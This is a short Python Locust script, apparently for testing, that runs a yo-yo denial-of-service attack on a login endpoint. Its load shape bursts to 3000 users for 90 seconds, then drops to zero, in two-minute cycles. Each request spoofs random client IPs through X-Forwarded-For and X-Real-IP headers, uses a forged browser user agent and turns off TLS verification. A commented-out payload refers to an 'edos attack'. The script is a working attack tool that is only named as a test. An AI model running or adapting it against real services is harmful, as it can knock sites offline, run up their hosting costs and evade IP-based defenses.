import random
import urllib3
from locust import HttpUser, task, constant, LoadTestShape

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class YoYoAttacker(HttpUser):
    wait_time = constant(0)

    def _random_ip(self):
        """Generate a random public IP address for spoofing."""
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    @task
    def attack_heavy(self):
        spoofed_ip = self._random_ip()
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "X-Forwarded-For": spoofed_ip,
            "X-Real-IP": spoofed_ip,
        }
        
      #  payload = {
      #      "challenge": "edos_attack_challenge_test",
      #       "signature": "dGhpcyBpcyBhIGZha2Ugc2lnbmF0dXJl=",  
      #      "agentCode": f"AGT-{random.randint(1000, 9999)}"      
      #  }
        payload = {
            "username": "demo_test",
            "password": "1212312121"
        }
        
        self.client.post("/api/login-simple", json=payload, headers=headers, verify=False)


class YoYoShape(LoadTestShape):
    CYCLE_TIME = 120 

    def tick(self):
        run_time = self.get_run_time()
        current_step = int(run_time) % self.CYCLE_TIME

        if current_step < 90: 
            return (3000, 100) 
        else:                  
            return (0, 50)     